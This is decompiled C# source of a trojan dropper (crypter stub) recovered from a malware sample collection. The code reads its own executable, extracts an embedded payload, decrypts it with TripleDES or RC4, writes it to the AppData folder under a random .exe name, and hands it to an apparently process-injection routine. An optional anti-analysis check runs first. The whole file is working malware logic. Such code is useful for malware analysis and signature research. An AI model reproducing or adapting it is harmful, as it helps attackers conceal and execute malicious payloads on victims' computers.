// Decompiled with JetBrains decompiler
// Type: Stub.Mymod
// Assembly: Stub, Version=2.0.0.2, Culture=neutral, PublicKeyToken=null
// MVID: D998FF3F-31C1-474D-AB90-B3CFC9EC5BB6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Dropper.MSIL.StubRC.afy-ee36551ac3637c0aa14dd39146a804c86161a4d4aba555b6ed5fad5d4acd5b21.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace Stub
{
  [StandardModule]
  internal sealed class Mymod
  {
    private static string res;
    private static string thepath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";

    public static int RandomNumber(int min, int max) => new Random().Next(min, max);

    public static string RandomString(int size, bool lowerCase)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      int num1 = checked (size - 1);
      int num2 = 0;
      while (num2 <= num1)
      {
        char ch = Convert.ToChar(Convert.ToInt32(26.0 * random.NextDouble() + 65.0));
        stringBuilder.Append(ch);
        checked { ++num2; }
      }
      return lowerCase ? stringBuilder.ToString().ToLower() : stringBuilder.ToString();
    }

    public static string GetRandom()
    {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append(Mymod.RandomString(4, true));
      stringBuilder.Append(Mymod.RandomNumber(1000, 9999));
      stringBuilder.Append(Mymod.RandomString(2, false));
      return stringBuilder.ToString();
    }

    [STAThread]
    public static void Main()
    {
      string Delimiter = "@fuck@";
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      Mymod.res = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileGet(1, ref Mymod.res);
      FileSystem.FileClose(1);
      string[] strArray = Strings.Split(Mymod.res, Delimiter);
      string str1 = strArray[1];
      string str2 = Mymod.GetRandom().ToString() + ".exe";
      string str3 = strArray[2];
      string Left = strArray[3];
      if (Operators.CompareString(strArray[4], "true", false) == 0)
        ant.mofo();
      if (Operators.CompareString(Left, "tripleDES", false) == 0)
      {
        FileSystem.FileOpen(1, Mymod.thepath + str2, OpenMode.Binary);
        FileSystem.FilePut(1, _3des.a(str1, str3, true), -1L, false);
        FileSystem.FileClose(1);
      }
      else if (Operators.CompareString(Left, "rc4", false) == 0)
      {
        FileSystem.FileOpen(1, Mymod.thepath + str2, OpenMode.Binary);
        FileSystem.FilePut(1, _4cr.enc(str1, str3), -1L, false);
        FileSystem.FileClose(1);
      }
      FileStream fileStream = new FileInfo(Mymod.thepath + str2).OpenRead();
      long length = fileStream.Length;
      if (length > 0L)
      {
        byte[] numArray = new byte[checked ((int) (length - 1L) + 1)];
        fileStream.Read(numArray, 0, checked ((int) length));
        rp.MakeIt(numArray, Process.GetCurrentProcess().MainModule.FileName);
        fileStream.Close();
      }
      ProjectData.EndApp();
    }
  }
}
